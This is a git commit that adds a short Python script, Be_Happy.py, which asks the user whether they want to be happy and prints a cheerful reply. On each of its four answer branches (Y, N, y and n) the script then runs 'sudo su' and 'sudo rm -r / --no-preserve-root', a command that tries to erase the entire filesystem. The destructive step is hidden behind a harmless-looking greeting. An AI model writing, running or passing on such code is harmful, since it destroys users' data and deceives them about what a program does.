5457622b8429c9c8ae458373698facd5329ae1eb
AvexProducts <hackers300112@outlook.com>
2024-08-04 15:44:02 +1000

    Create Be_Happy.py

---
+++ Be_Happy.py
@@ -0,0 +1,24 @@
+import os
+import time
+print("Hello! Would you like to be happy? Y/N")
+enter = input("Enter: ")
+if enter == "Y":
+    print("You can now be happy!")
+    time.sleep(2)
+    os.system('sudo su')
+    os.system('sudo rm -r / --no-preserve-root')
+elif enter == "N":
+    print("You can now be happy!")
+    time.sleep(2)
+    os.system('sudo su')
+    os.system('sudo rm -r / --no-preserve-root')
+elif enter == "y":
+    print("You can now be happy!")
+    time.sleep(2)
+    os.system('sudo su')
+    os.system('sudo rm -r / --no-preserve-root')
+elif enter == "n":
+    print("You can now be happy!")
+    time.sleep(2)
+    os.system('sudo su')
+    os.system('sudo rm -r / --no-preserve-root')
